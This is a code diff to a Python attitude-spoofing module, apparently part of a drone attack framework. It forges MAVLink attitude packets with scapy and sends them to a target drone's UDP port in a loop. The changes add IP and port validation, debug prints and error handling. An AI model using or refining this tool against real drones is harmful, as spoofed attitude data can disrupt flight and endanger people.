@@ -3,6 +3,14 @@ from pymavlink import mavutil
 from scapy.all import *
 import time
 import random
+import socket
+
+def is_valid_ip(ip):
+    try:
+        socket.inet_pton(socket.AF_INET, ip)
+        return True
+    except socket.error:
+        return False
 
 class AttitudeSpoofingModule(BaseModule):
     def __init__(self):
@@ -50,15 +58,38 @@ class AttitudeSpoofingModule(BaseModule):
         return attitude.pack(mav)
 
     def send_mavlink_packet(self, packet_data, target_ip, target_port):
+        if not is_valid_ip(target_ip):
+            print(f"Error: Invalid IP address {target_ip}")
+            return
+        
         packet = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=packet_data)
-        send(packet)
+        try:
+            send(packet)
+        except OSError as e:
+            print(f"Error sending packet: {e}")
 
     def run(self):
-        target_ip = self.options["target"][0]
-        target_port = int(self.options["port"][0])
+        # Retrieve and strip whitespace from options
+        target_ip = self.options.get("target", [""])[0].strip()
+        target_port = self.options.get("port", ["14550"])[0].strip()
 
-        if not target_ip or target_port <= 0:
-            print("Invalid target IP or port.")
+        # Debug prints to check the values
+        print(f"Debug: Retrieved target IP is '{target_ip}'")
+        print(f"Debug: Retrieved target port is '{target_port}'")
+
+        # Convert port to integer
+        try:
+            target_port = int(target_port)
+        except ValueError:
+            print("Invalid port value.")
+            return
+
+        if not is_valid_ip(target_ip):
+            print(f"Invalid target IP: {target_ip}")
+            return
+
+        if target_port <= 0:
+            print("Invalid target port.")
             return
 
         while True:
